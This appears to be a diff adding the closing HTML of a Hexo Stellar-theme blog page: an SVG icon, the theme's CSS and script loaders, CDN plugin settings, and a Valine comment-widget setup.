+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
